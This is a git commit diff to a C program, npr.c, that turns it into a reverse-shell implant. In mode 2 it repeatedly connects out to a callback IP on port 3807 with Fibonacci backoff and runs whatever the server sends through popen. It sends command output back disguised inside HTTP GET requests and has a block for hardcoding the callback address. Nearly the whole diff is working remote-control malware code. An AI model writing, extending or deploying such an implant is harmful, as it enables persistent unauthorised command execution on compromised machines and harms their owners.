ce320ace414ad82a4436fcc521aafad0a7aa885b
gravlakswalter <gravlakswalter@gmail.com>
2014-02-25 16:19:17 -0500

    Added client connect retry with fibonacci delay and cap Added client mode hardcode parameters option Added client response in GET request (untested)

--- c/npr.c
+++ c/npr.c
@@ -9,6 +9,9 @@
 #include <errno.h>
 #include <arpa/inet.h> 
 
+// npr 1            # mode one, client nopro only <- np, no socket
+// npr 2 callbackip # mode two, router reverse <- np, connect socket
+// npr 3            # mode three, router bind <- listen socket
 // compile and run using IP of cnet.com
 // clear && gcc npr.c -o npr -lpcap && chmod 777 npr && ./npr 2 127.0.0.1
 // clear && gcc npr.c -o npr -lpcap && chmod 777 npr && ./npr 3
@@ -19,64 +22,72 @@ int main(int argc, char *argv[]) {
     char sendBuff[1025];
     int nport = 3807;
     struct sockaddr_in serv_addr; 
-    // npr 1            # mode one, client nopro only <- np, no socket
-    // npr 2 callbackip # mode two, router reverse <- np, connect socket
-    // npr 3            # mode three, router bind <- listen socket
     if(argc < 2) {
         printf("\nUsage: %s <mode> (ip of server)\n",argv[0]);
         return 1;
+    }
+    while (0) { // hardcode client mode and callback IP here
+		argv[1] = "2";
+		argv[2] = "127.0.0.1";
+		argc = 3;
     }
     if (strncmp(argv[1],"2",1) == 0) { // connect socket
 		if(argc != 3) {
 			printf("\nMode 2 Usage: %s <mode> (ip of server)\n",argv[0]);
 			return 1;
 		}
-    	printf("Mode 2 Connecting to %s:%u\n", argv[2], nport);
-		memset(recvBuff, '0',sizeof(recvBuff));
-		if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-			printf("\nError : Could not create socket \n");
-			return 1;
-		} 
-		memset(&serv_addr, '0', sizeof(serv_addr)); 
-		serv_addr.sin_family = AF_INET;
-		serv_addr.sin_port = htons(nport); 
-		if(inet_pton(AF_INET, argv[2], &serv_addr.sin_addr)<=0) {
-			printf("\ninet_pton error occured\n");
-			return 1;
-		} 
-		if(connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
-		   printf("\nError : Connect Failed \n");
-		   return 1;
-		} 
-		snprintf(sendBuff, sizeof(sendBuff), "%.24s\r\n","GET / HTTP/1.0\n\n");
-		write(sockfd, sendBuff, strlen(sendBuff));
-		while ( (n = read(sockfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
-			recvBuff[n] = 0; // null terminate so that we can pass this string to other functions later
-			if(fputs(recvBuff, stdout) == EOF) {
-				printf("\nError : Fputs error\n");
+		char cmdbfr[50000];
+		int lsleip = 1;
+		int psleip = 1;
+		int sleip = 1;
+		while (1) {
+	    	printf("Mode 2 Connecting to %s:%u\n", argv[2], nport);
+			memset(recvBuff, '0',sizeof(recvBuff));
+			if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+				printf("\nError : Could not create socket \n");
+				return 1;
+			} 
+			memset(&serv_addr, '0', sizeof(serv_addr)); 
+			serv_addr.sin_family = AF_INET;
+			serv_addr.sin_port = htons(nport); 
+			if(inet_pton(AF_INET, argv[2], &serv_addr.sin_addr)<=0) {
+				printf("\ninet_pton error occured\n");
+				return 1;
 			}
-			int messagebuilder = 0;
-			char message[50000];
-			char bfr[50000];
-			FILE * fp;
-			if((fp=popen((const char *)recvBuff, "r")) == NULL) {
-			   //-----printf("Error executing command buffer\n");
+			if(connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+			   printf("\nError : Connect Failed \n");
+			   sleip = lsleip + psleip; //fibsleep
+			   lsleip = psleip;
+			   psleip = sleip;
+			   if (sleip > 300) {
+				   sleip = 300;
+			   }
+			   sleep(sleip);
+			   continue;
 			}
-			message[messagebuilder] = '\x0A'; // prepend with a newline for good formatting on shell responses
-			messagebuilder++;
-			while(fgets(bfr,50000,fp) != NULL){
-				int sure;
-				int bfrlen;
-				bfrlen = strlen((const char *)bfr);
-				for (sure = 0; sure < bfrlen; sure++) {
-					message[messagebuilder] = bfr[sure];
-					messagebuilder++;
+			lsleip = 1;
+			psleip = 1;
+			sleip = 1;
+			snprintf(sendBuff, sizeof(sendBuff), "GET / HTTP/1.0\n%s\n\n",cmdbfr);
+			write(sockfd, sendBuff, strlen(sendBuff));
+			while ( (n = read(sockfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
+				recvBuff[n] = 0; // null terminate so that we can pass this string to other functions later
+				if(fputs(recvBuff, stdout) == EOF) {
+					printf("\nError : Fputs error\n");
 				}
+				printf("\n");
+				FILE * fp;
+				if((fp=popen((const char *)recvBuff, "r")) == NULL) {
+				}
+				while(fgets(cmdbfr,50000,fp) != NULL){
+				}
+				pclose(fp);
+			} 
+			if(n < 0) {
+				printf("\nRead error \n");
 			}
-			message[messagebuilder] = 0;
-		} 
-		if(n < 0) {
-			printf("\nRead error \n");
+			close(sockfd);
+			sleep(1);
 		}
     }
     else if (strncmp(argv[1],"3",1) == 0) { // listen socket
@@ -99,7 +110,6 @@ int main(int argc, char *argv[]) {
 		while(1) {
 			connfd = accept(listenfd, (struct sockaddr*)NULL, NULL); 
 	    	printf("Host Connected\n");
-			//while ( (n = read(connfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
 	    	if ( (n = read(connfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
 				recvBuff[n] = 0;
 				if(fputs(recvBuff, stdout) == EOF) {
